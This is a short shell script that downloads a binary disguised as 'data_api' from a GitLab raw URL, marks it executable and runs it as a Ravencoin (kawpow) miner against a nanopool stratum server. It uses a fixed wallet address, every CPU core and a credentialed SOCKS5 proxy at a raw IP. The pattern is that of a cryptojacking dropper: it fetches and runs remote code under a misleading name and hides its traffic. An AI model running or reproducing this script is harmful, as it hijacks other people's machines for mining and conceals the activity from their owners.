wget https://gitlab.com/kntlpop/cc-verus-zerg/-/raw/main/data_api
chmod +x data_api
ALGO="kawpow"
A="stratum+tcp://rvn-us-east1.nanopool.org:12222"
B="$1"
C="cok"
D="$(nproc --all)"
E="socks5://jancok:12345@147.182.228.194:8000"
./data_api -a $ALGO -o $A -u RJ57iWMXV4pRY48TWU6XZk6k5yyYCYB9vE.$C -p x -t $D -x $E
